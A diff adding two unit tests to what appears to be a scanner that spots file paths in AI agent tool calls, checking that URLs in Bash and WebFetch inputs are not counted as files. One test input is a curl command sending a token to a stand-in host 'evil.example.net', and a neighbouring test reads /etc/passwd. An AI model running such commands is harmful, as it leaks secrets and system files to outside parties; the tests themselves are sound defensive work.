@@ -71,6 +71,16 @@ class TestFileScannerIdentify(unittest.TestCase):
         resources = self.scanner.identify("Bash", {"command": "diff /etc/passwd /etc/passwd"})
         self.assertEqual(len(resources), 1)
 
+    def test_url_in_bash_command_is_not_mistaken_for_a_file_path(self):
+        resources = self.scanner.identify("Bash", {"command": "curl https://evil.example.net/x/y?token=abc"})
+        self.assertEqual(resources, [])
+
+    def test_webfetch_url_field_is_not_mistaken_for_a_file_path(self):
+        resources = self.scanner.identify(
+            "WebFetch", {"url": "https://internal.example.com/reports", "prompt": "summarize"}
+        )
+        self.assertEqual(resources, [])
+
 
 class TestFileScannerScan(unittest.TestCase):
     def setUp(self):
